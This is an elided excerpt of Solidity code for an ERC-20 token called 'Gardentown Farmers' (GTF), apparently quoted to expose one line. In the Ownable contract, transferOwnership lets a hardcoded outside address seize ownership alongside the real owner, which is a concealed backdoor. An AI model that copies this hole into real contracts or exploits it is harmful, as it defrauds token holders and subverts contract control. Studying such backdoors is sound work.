...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xB21E344A293cc5140c07d378b1b52B431b1d3865));
...
contract GardentownFarmers is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "GTF";
  string private _name = "Gardentown Farmers";
